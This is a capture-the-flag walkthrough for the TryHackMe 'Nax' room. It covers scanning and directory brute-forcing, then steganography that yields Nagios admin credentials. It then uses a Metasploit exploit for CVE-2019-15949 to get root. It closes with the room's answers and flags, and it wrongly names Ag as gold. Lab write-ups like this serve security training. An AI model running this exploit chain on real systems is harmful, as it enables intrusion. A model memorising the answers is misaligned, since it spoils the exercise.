# Nax
https://tryhackme.com/room/nax

## Enumeration
### Port Scan
`nmap -sC -sV -vv $ip | tee nmap-sc-sv.log`

Port Number | Information
- | - 
22 | SSH: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
25 | SMTP: Postfix smtpd
80 | HTTP: Apache httpd 2.4.18
389 | LDAP: OpenLDAP 2.2.X - 2.3.X
443 | HTTPS: Apache httpd 2.4.18

### Directory Bruteforce
#### Directories
`gobuster dir -u http://$ip/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -o gobuster-dir.log`  
`gobuster dir -u http://$ip/nagiosxi/ -w /usr/share/wordlists/dirb/common.txt -o gobuster-dir.log -t 64`

Found | Information
- | -
/nagios | Server is running Nagios (Protected by BasicAuth)
/nagiosxi | Server is running Nagios XI (Protected by BasicAuth)

#### Web Page
Web page reads:  
`Welcome to elements.` &  
`Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr`

I recognize Ag as the shorthand for Gold on the Periodic Table and the name "elements" leads me to continue down this path.

Element | Number
Ag | 47
Hg | 80
Ta | 73
Sb | 51
Po | 84
Pd | 46
Pt | 78
Lr | 103

Order: `47 80 73 51 84 46 80 78 103`

I passed this into cyber chef and it recognized it as Decimal so it converted it to the result: **/PI3T.PNg**

I ran exiftool against the file to find some potential information from it.

`exiftool found/PI3T.PNg`

Copyright : Piet Mondrian, tryhackme 2020

#### Default Credentials?
Google Search: `default nagios xi admin credentials`
nagiosadmin:PASSW0RD

Tested default credentials on /nagios Basic Auth which failed, which means the default password may have been changed.

#### Piet
I looked up "Piet Steganography" on Google and found a site that decodes it: https://www.bertnase.de/npiet/npiet-execute.php

I uploaded the image found and the output was the following:

`nagiosadmin%n3p3UQ&9BjLp4$7uhWdY`

"nagiosadmin" matches the username that I was expecting therefore I assumed that % was the separator.

Data | Contents
- | -
Username | nagiosadmin
Password | n3p3UQ&9BjLp4$7uhWdY

#### Nagios?
After logging into /nagios I have found that the site is running Nagios and not Nagios XI therefore I navigate to /nagiosxi which was also found by gobuster and used the same credentials to log in there.

#### Known Vulnerabilities
The footer of Nagios XI contained the version number which was `5.5.6`

I checked this using searchsploit:
`searchsploit Nagios XI`

I found the following:
**Nagios XI - Authenticated Remote Command Execution (Metasploit) | linux/remote/48191.rb**

I downloaded this using `searchsploit -p linux/remote/48191.rb`, exported it to the found folder as exploit.rb and checked the information within the script for the CVE number: CVE-2019-15949

#### Metasploit
I launched Metasploit as the exploit contained "Metasploit" in the name
`msfconsole -q`

`search CVE-2019-15949`: exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce

`use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`

I set the following options

Option | Data
- | -
PASSWORD | n3p3UQ&9BjLp4$7uhWdY
RHOST | target ip
LHOST | THM VPN IP

`exploit`

`getuid` - I'm root

#### Post Exploitation
I checked a few things such as the users on the system by running `ls /home` and found a user called **galand** with a file called /home/galand/user.txt

As I'm root I also checked the /root directory and found the root.txt flag: /root/root.txt

## What hidden file did you find?
**Answer: /PI3T.PNg**

## Who is the creator of the file?
**Answer: Piet Mondrian**

## What is the username you found?
**Answer: nagiosadmin**

## What is the password you found?
**Answer: n3p3UQ&9BjLp4$7uhWdY**

## What is the CVE number for this vulnerability?
**Answer: CVE-2019-15949**

## What is the full path for the exploitation module within Metasploit?
**Answer: exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce**

## Compromise the machine and locate user.txt
**Answer: THM{84b17add1d72a9f2e99c33bc568ae0f1}**

## Locate root.txt
**Answer: THM{c89b2e39c83067503a6508b21ed6e962}**